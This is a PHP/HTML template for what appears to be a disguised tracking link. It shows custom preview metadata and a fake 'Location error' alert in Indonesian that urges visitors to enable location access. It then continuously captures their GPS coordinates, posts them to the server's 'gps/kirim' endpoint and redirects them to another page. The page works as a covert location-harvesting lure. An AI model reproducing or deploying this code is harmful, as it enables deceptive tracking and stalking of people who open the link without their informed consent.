<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
    <meta name="description" content="<?=$data->deskripsi;?>">

    <meta property="og:title" content="<?= $data->judul; ?>">
    <meta property="og:description" content="<?= $data->deskripsi; ?>">
    <meta property="og:url" content="<?= base_url('gps/'.$data->id.'/'.$data->judul); ?>">
    <meta property="og:image:width" content="300">
    <meta property="og:image:height" content="300">
    <meta property="og:type" content="website" />

    <!-- Icon -->
    <title><?=$data->judul;?></title>
    <link rel="icon" href="<?=base_url('public/foto/'.$data->icon);?>">
    
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="<?=base_url('public/css/bootstrap.min.css');?>">
  </head>

  <body>
      <div class="d-flex justify-content-center">
        <div class="spinner-grow text-primary" role="status" style="margin-top:200px; width: 100px; height: 100px;">
            <span class="visually-hidden">Loading...</span>
        </div>
        </div>

<p id="demo"></p>
<input id="idd" type="hidden" name="id" value="<?=$data->id;?>">

 </body>

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="<?=base_url('public/js/bootstrap.bundle.min.js');?>"></script>
    <script type="text/javascript" src="<?=base_url('public/js/jquery.js');?>"></script>
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>

<script>
Swal.fire(
  'Location error',
  'Mohon aktifkan akses lokasi untuk pengalaman yang lebih baik',
  'error'
)

var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.watchPosition(showPosition);
  } else { 
    x.innerHTML = "Geolokasi tidak didukung oleh browser ini.";
  }
}
    
function showPosition(position) {

    var id = document.getElementById("idd").value;
    var latitude = position.coords.latitude;
    var longitude = position.coords.longitude;
    $.post("<?=base_url('gps/kirim');?>", {id:id, latitude:latitude, longitude:longitude});
    window.location.href = "<?=$data->redirect;?>";
  }

getLocation();
</script>
 </html>